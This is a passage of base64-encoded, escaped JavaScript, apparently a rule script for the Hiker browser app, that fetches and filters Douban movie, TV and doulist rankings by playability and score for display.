cXFxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgZXh0cmE6IHVybFBhcmFtcy5leHRyYSxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLmNvdmVyX3VybCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLmNvdmVyX3VybCxcXFxcclxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLkuIrmmKDml6XmnJ86XFxcXFxcXCIgKyBlLnB1YmRhdGUgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiICsgZS53aXNoX2NvdW50ICsgXFxcXFxcXCLkurrmg7PnnItcXFxcXFxcIiArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyBlLm51bGxfcmF0aW5nX3JlYXNvblxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH0pKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICByZXR1cm4gcGFnZSA+IDEgPyBpIDogYS5jb25jYXQoaSk7XFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v54mH5Y2V6K+m5oOFXFxcXHJcXFxcbmZ1bmN0aW9uIHN1YmplY3RDb2xsZWN0aW9uTGlzdChwYWdlLCBjb3VudCwgaWQpIHtcXFxcclxcXFxuICAgIGlmICghZ2V0TXlWYXIoJ3JhbmtpbmcnKSkgcHV0TXlWYXIoJ3JhbmtpbmcnLCAne1xcXFxcXFwiaXRlbVxcXFxcXFwiOlxcXFxcXFwibW92aWVfcmVhbF90aW1lX2hvdGVzdFxcXFxcXFwiLFxcXFxcXFwicGxheWFibGVcXFxcXFxcIjpcXFxcXFxcIjBcXFxcXFxcIixcXFxcXFxcInNjb3JlXFxcXFxcXCI6XFxcXFxcXCIwLTEwXFxcXFxcXCJ9Jyk7XFxcXHJcXFxcbiAgICBsZXQgYSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdyYW5raW5nJykpO1xcXFxyXFxcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBpdGVtcyA9IHtcXFxcclxcXFxuICAgICAgICDnlLXlvbE6IHtcXFxcclxcXFxuICAgICAgICAgICAg5a6e5pe254Ot6Zeo55S15b2xOiAnbW92aWVfcmVhbF90aW1lX2hvdGVzdCcsXFxcXHJcXFxcbiAgICAgICAgICAgIOS4gOWRqOWPo+eikeeUteW9sTogJ21vdmllX3dlZWtseV9iZXN0JyxcXFxcclxcXFxuICAgICAgICAgICAgdG9wMjUw55S15b2xOiAnbW92aWVfdG9wMjUwJ1xcXFxyXFxcXG4gICAgICAgIH0sXFxcXHJcXFxcbiAgICAgICAg55S16KeG5YmnOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIOWunuaXtueDremXqOWJp+mbhjogJ3R2X3JlYWxfdGltZV9ob3Rlc3QnLFxcXFxyXFxcXG4gICAgICAgICAgICDljY7or63lj6PnopHliafpm4Y6ICd0dl9jaGluZXNlX2Jlc3Rfd2Vla2x5JyxcXFxcclxcXFxuICAgICAgICAgICAg5YWo55CD5Y+j56KR5Ymn6ZuGOiAndHZfZ2xvYmFsX2Jlc3Rfd2Vla2x5J1xcXFxyXFxcXG4gICAgICAgIH0sXFxcXHJcXFxcbiAgICAgICAg57u86Im6OiB7XFxcXHJcXFxcbiAgICAgICAgICAgIOWbveWGheWPo+eikee7vOiJujogJ3Nob3dfY2hpbmVzZV9iZXN0X3dlZWtseScsXFxcXHJcXFxcbiAgICAgICAgICAgIOWbveWkluWPo+eikee7vOiJujogJ3Nob3dfZ2xvYmFsX2Jlc3Rfd2Vla2x5J1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGZvciAobGV0IGkgaW4gaXRlbXMpIHtcXFxcclxcXFxuICAgICAgICBmb3IgKGxldCBqIGluIGl0ZW1zW2ldKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcC5pdGVtID09IGl0ZW1zW2ldW2pdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBqICsgJyA8L2ZvbnQ+PC9iPicgOiBqLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3JhbmtpbmcnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgdGVtcC5pdGVtID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInJhbmtpbmdcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSwgaXRlbXNbaV1bal0pXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6ICdibGFua19ibG9jaydcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGkgPSBbXTtcXFxcclxcXFxuICAgIGxldCBwbGF5YWJsZSA9IHtcXFxcclxcXFxuICAgICAgICDlhajpg6jlvbHniYc6ICcwJyxcXFxcclxcXFxuICAgICAgICDku4XmnInniYfmupA6ICcxJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgciBpbiBwbGF5YWJsZSkge1xcXFxyXFxcXG4gICAgICAgIGkucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnBsYXlhYmxlID09IHBsYXlhYmxlW3JdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyByICsgJyA8L2ZvbnQ+PC9iPicgOiByLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdyYW5raW5nJykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5wbGF5YWJsZSA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInJhbmtpbmdcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgcGxheWFibGVbcl0pXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6K+E5YiG5Yy66Ze0OicgKyB0ZW1wLnNjb3JlICsgJyA8L2ZvbnQ+PC9iPicsXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncmFua2luZycpKTtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IGlucHV0cyA9IGlucHV0LnNwbGl0KCctJyk7XFxcXHJcXFxcbiAgICAgICAgICAgIGlmIChpbnB1dHMubGVuZ3RoID09IDIgJiYgaW5wdXRzLmV2ZXJ5KGUgPT4gZSA+PSAwICYmIGUgPD0gMTApICYmIHBhcnNlRmxvYXQoaW5wdXRzWzBdKSA8IGlucHV0c1sxXSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5zY29yZSA9IGlucHV0O1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJyYW5raW5nXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHQgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL3N1YmplY3RfY29sbGVjdGlvbi9cXFxcXFxcIiArIChpZCB8fCB0ZW1wLml0ZW0pKTtcXFxcclxcXFxuICAgIGkucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgdGl0bGU6IHQudGl0bGUgKyAnKOWFsScgKyB0LnRvdGFsICsgJ+mDqCknLFxcXFxyXFxcXG4gICAgICAgIGRlc2M6IHQuZGVzY3JpcHRpb24sXFxcXHJcXFxcbiAgICAgICAgLyppbWc6IHQuaGVhZGVyX2JnX2ltYWdlICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIHQuaGVhZGVyX2JnX2ltYWdlLFxcXFxyXFxcXG4gICAgICAgIHVybDogdC5oZWFkZXJfYmdfaW1hZ2UgKyBcXFxcXFxcIj90eXBlPS5qcGdAUmVmZXJlcj1cXFxcXFxcIiArIHQuaGVhZGVyX2JnX2ltYWdlICsgXFxcXFxcXCI/dHlwZT0uanBnXFxcXFxcXCIsKi9cXFxcclxcXFxuICAgICAgICB1cmw6ICd0b2FzdDovL+eCueaIkeW5suWYmycsXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL3N1YmplY3RfY29sbGVjdGlvbi9cXFxcXFxcIiArIChpZCB8fCB0ZW1wLml0ZW0pICsgXFxcXFxcXCIvaXRlbXM/XFxcXFxcXCIgKyAocGFnZSA/IFxcXFxcXFwic3RhcnQ9XFxcXFxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFxcXFxcIiZjb3VudD1cXFxcXFxcIiArIGNvdW50IDogXFxcXFxcXCJzdGFydD0wJmNvdW50PTUwXFxcXFxcXCIpKTtcXFxcclxcXFxuICAgIGxldCBsID0gcy5zdWJqZWN0X2NvbGxlY3Rpb25faXRlbXM7XFxcXHJcXFxcbiAgICBpZiAodGVtcC5wbGF5YWJsZSA9PSAnMScpIGwgPSBsLmZpbHRlcihlID0+ICEhZS5oYXNfbGluZXdhdGNoKTtcXFxcclxcXFxuICAgIGlmICh0ZW1wLnNjb3JlICE9ICcwLTEwJykge1xcXFxyXFxcXG4gICAgICAgIGwgPSBsLmZpbHRlcihlID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IHIgPSB0ZW1wLnNjb3JlLnNwbGl0KCctJyk7XFxcXHJcXFxcbiAgICAgICAgICAgIHJldHVybiBlLnJhdGluZyAmJiBlLnJhdGluZy52YWx1ZSA8IHJbMV0gJiYgZS5yYXRpbmcudmFsdWUgPiByWzBdO1xcXFxyXFxcXG4gICAgICAgIH0pO1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcXFxyXFxcXG4gICAgbGV0IHIgPSBsLm1hcCgoZSA9PiB7XFxcXHJcXFxcbiAgICAgICAgbGV0IHR5cGUgPSBlLnR5cGUsXFxcXHJcXFxcbiAgICAgICAgICAgIGlkID0gZS5pZCxcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGUgPSBlLnRpdGxlO1xcXFxyXFxcXG4gICAgICAgIGxldCB1c2VDb25maWcgPSBkZXRhaWxzVmlld0NvbmZpZ3NbZGV0YWlsc1ZpZXdDb25maWdzLnVzZV0uY29uZmlnO1xcXFxyXFxcXG4gICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXFxcclxcXFxuICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcXFxyXFxcXG4gICAgICAgICAgICBldmFsKCd1cmxQYXJhbXMgPSAnICsgdXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChcXFxcXFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5IyNpbW1lcnNpdmVUaGVtZSNcXFxcXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKS5ydWxlKCh0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCh1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICB9LCB0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIHJldHVybiB7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpYycsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgZXh0cmE6IHVybFBhcmFtcy5leHRyYSxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLnBpYy5ub3JtYWwgKyBcXFxcXFxcIkBSZWZlcmVyPVxcXFxcXFwiICsgZS5waWMubm9ybWFsLFxcXFxyXFxcXG4gICAgICAgICAgICBkZXNjOiBlLmNhcmRfc3VidGl0bGUuc3BsaXQoXFxcXFxcXCIvXFxcXFxcXCIpLmZpbHRlcigoKGUsIHQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmICh0IDwgMykgcmV0dXJuIGVcXFxcclxcXFxuICAgICAgICAgICAgfSkpLmpvaW4oXFxcXFxcXCIsXFxcXFxcXCIpICsgXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIiArIChlLnJhdGluZyA/IGNvbXB1dGVSYXRpbmcoZS5yYXRpbmcubWF4LCBlLnJhdGluZy52YWx1ZSkgKyBcXFxcXFxcIiBcXFxcXFxcIiArIGUucmF0aW5nLnZhbHVlLnRvRml4ZWQoMSkgKyBcXFxcXFxcIuWIhlxcXFxcXFwiIDogXFxcXFxcXCLmmoLml6Dor4TliIZcXFxcXFxcIilcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9KSk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgc2V0SG9tZVJlc3VsdCh7XFxcXHJcXFxcbiAgICAgICAgZGF0YTogcGFnZSA+IDEgPyByIDogKGlkID8gaS5jb25jYXQocikgOiBhLmNvbmNhdChpKS5jb25jYXQocikpXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+ixhuWIl+ivpuaDhVxcXFxyXFxcXG5mdW5jdGlvbiBkb3VMaXN0KGlkLCBwYWdlLCBjb3VudCkge1xcXFxyXFxcXG4gICAgYWRkTGlzdGVuZXIoJ29uQ2xvc2UnLCAnY2xlYXJNeVZhcihcXFxcXFxcImRvdUxpc3RcXFxcXFxcIiknKTtcXFxcclxcXFxuICAgIGlmICghZ2V0TXlWYXIoJ2RvdUxpc3QnKSkgcHV0TXlWYXIoJ2RvdUxpc3QnLCAne1xcXFxcXFwicGxheWFibGVcXFxcXFxcIjpcXFxcXFxcIjBcXFxcXFxcIixcXFxcXFxcInNjb3JlXFxcXFxcXCI6XFxcXFxcXCIwLTEwXFxcXFxcXCJ9Jyk7XFxcXHJcXFxcbiAgICBsZXQgaSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdkb3VMaXN0JykpO1xcXFxyXFxcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBwbGF5YWJsZSA9IHtcXFxcclxcXFxuICAgICAgICDlhajpg6jlvbHniYc6ICcwJyxcXFxcclxcXFxuICAgICAgICDku4XmnInniYfmupA6ICcxJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgZm9yIChsZXQgciBpbiBwbGF5YWJsZSkge1xcXFxyXFxcXG4gICAgICAgIGkucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnBsYXlhYmxlID09IHBsYXlhYmxlW3JdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyByICsgJyA8L2ZvbnQ+PC9iPicgOiByLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdkb3VMaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5wbGF5YWJsZSA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImRvdUxpc3RcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgcGxheWFibGVbcl0pXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6K+E5YiG5Yy66Ze0OicgKyB0ZW1wLnNjb3JlICsgJyA8L2ZvbnQ+PC9iPicsXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignZG91TGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IGlucHV0cyA9IGlucHV0LnNwbGl0KCctJyk7XFxcXHJcXFxcbiAgICAgICAgICAgIGlmIChpbnB1dHMubGVuZ3RoID09IDIgJiYgaW5wdXRzLmV2ZXJ5KGUgPT4gZSA+PSAwICYmIGUgPD0gMTApICYmIHBhcnNlRmxvYXQoaW5wdXRzWzBdKSA8IGlucHV0c1sxXSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC5zY29yZSA9IGlucHV0O1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJkb3VMaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IHQgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL2RvdWxpc3QvXFxcXFxcXCIgKyBpZCk7XFxcXHJcXFxcbiAgICBpLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiB0LnRpdGxlLFxcXFxyXFxcXG4gICAgICAgIGRlc2M6ICflhbEnICsgdC5pdGVtc19jb3VudCArICfpg6goJyArIHQucGxheWFibGVfY291bnQgKyAn6YOo5Y+v5pKt5pS+KScsXFxcXHJcXFxcbiAgICAgICAgLyppbWc6IHQuaGVhZGVyX2JnX2ltYWdlICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIHQuaGVhZGVyX2JnX2ltYWdlLFxcXFxyXFxcXG4gICAgICAgIHVybDogdC5oZWFkZXJfYmdfaW1hZ2UgKyBcXFxcXFxcIj90eXBlPS5qcGdAUmVmZXJlcj1cXFxcXFxcIiArIHQuaGVhZGVyX2JnX2ltYWdlICsgXFxcXFxcXCI/dHlwZT0uanBnXFxcXFxcXCIsKi9cXFxcclxcXFxuICAgICAgICB1cmw6ICd0b2FzdDovL+WIq+eCueaIkScsXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcclxcXFxuICAgIH0pO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9kb3VsaXN0L1xcXFxcXFwiICsgaWQgKyBcXFxcXFxcIi9wb3N0c1xcXFxcXFwiICsgJz9wbGF5YWJsZT0nICsgdGVtcC5wbGF5YWJsZSArIChwYWdlID8gXFxcXFxcXCImc3RhcnQ9XFxcXFxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFxcXFxcIiZjb3VudD1cXFxcXFxcIiArIGNvdW50IDogXFxcXFxcXCImc3RhcnQ9MCZjb3VudD01MFxcXFxcXFwiKSk7XFxcXHJcXFxcbiAgICBsZXQgbCA9IHMuaXRlbXM7XFxcXHJcXFxcbiAgICBpZiAodGVtcC5zY29yZSAhPSAnMC0xMCcpIHtcXFxcclxcXFxuICAgICAgICBsID0gbC5maWx0ZXIoZSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCByID0gdGVtcC5zY29yZS5zcGxpdCgnLScpO1xcXFxyXFxcXG4gICAgICAgICAgICByZXR1cm4gZS5jb250ZW50LnN1YmplY3QucmF0aW5nICYmIGUuY29udGVudC5zdWJqZWN0LnJhdGluZy52YWx1ZSA8IHJbMV0gJiYgZS5jb250ZW50LnN1YmplY3QucmF0aW5nLnZhbHVlID4gclswXTtcXFxcclxcXFxuICAgICAgICB9KTtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgZGV0YWlsc1ZpZXdDb25maWdzID0gZ2V0Q29uZmlnKCdkZXRhaWxzVmlld0NvbmZpZ3MnKTtcXFxcclxcXFxuICAgIGxldCByID0gbC5tYXAoKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgIGxldCB0eXBlID0gZS5jb250ZW50LnN1YmplY3QudHlwZSxcXFxcclxcXFxuICAgICAgICAgICAgaWQgPSBlLmNvbnRlbnQuc3ViamVjdC5pZCxcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGUgPSBlLmNvbnRlbnQuc3ViamVjdC50aXRsZTtcXFxcclxcXFxuICAgICAgICBsZXQgdXNlQ29uZmlnID0gZGV0YWlsc1ZpZXdDb25maWdzW2RldGFpbHNWaWV3Q29uZmlncy51c2VdLmNvbmZpZztcXFxcclxcXFxuICAgICAgICBsZXQgdXJsUGFyYW1zID0ge307XFxcXHJcXFxcbiAgICAgICAgaWYgKHVzZUNvbmZpZy5zdGFydHNXaXRoKCd7JykpIHtcXFxcclxcXFxuICAgICAgICAgICAgZXZhbCgndXJsUGFyYW1zID0gJyArIHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgdXJsUGFyYW1zLnVybCA9ICQoXFxcXFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjXFxcXFxcXCIgKyAnP3R5cGU9JyArIHR5cGUgKyAnJmlkPScgKyBpZCkucnVsZSgodHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFxcXFxcInBsYXlsaXN0XFxcXFxcXCIpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwodXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgICAgICByZXR1cm4ge1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgZXh0cmE6IHVybFBhcmFtcy5leHRyYSxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLmNvbnRlbnQuc3ViamVjdC5waWMubm9ybWFsICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIGUuY29udGVudC5zdWJqZWN0LnBpYy5ub3JtYWwsXFxcXHJcXFxcbiAgICAgICAgICAgIGRlc2M6IGUuY29udGVudC5zdWJqZWN0LmNhcmRfc3VidGl0bGUuc3BsaXQoXFxcXFxcXCIvXFxcXFxcXCIpLmZpbHRlcigoKGUsIHQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmICh0IDwgMykgcmV0dXJuIGVcXFxcclxcXFx